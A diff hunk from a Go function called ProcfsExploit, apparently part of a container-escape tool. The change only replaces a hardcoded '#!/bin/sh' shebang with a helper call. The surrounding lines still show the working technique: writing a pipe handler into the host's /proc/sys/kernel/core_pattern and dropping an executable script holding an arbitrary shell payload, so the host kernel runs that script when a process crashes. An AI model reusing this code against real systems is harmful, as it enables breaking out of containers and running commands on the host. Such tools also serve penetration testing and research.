@@ -120,7 +120,7 @@ func ProcfsExploit(procDir string, shellPayload string) {
 	corePatternPayload := fmt.Sprintf("|%s/cmd_%s", dockerPath, randKey)
 	corePatternFile := procDir + "/sys/kernel/core_pattern"
 	expScript := "/cmd_" + randKey
-	expPayload := "#!/bin/sh\n" + shellPayload
+	expPayload := util.ShellShebang() + shellPayload
 
 	util.RewriteFile(corePatternFile, corePatternPayload, 0644)
 	util.RewriteFile(expScript, expPayload, 0777)
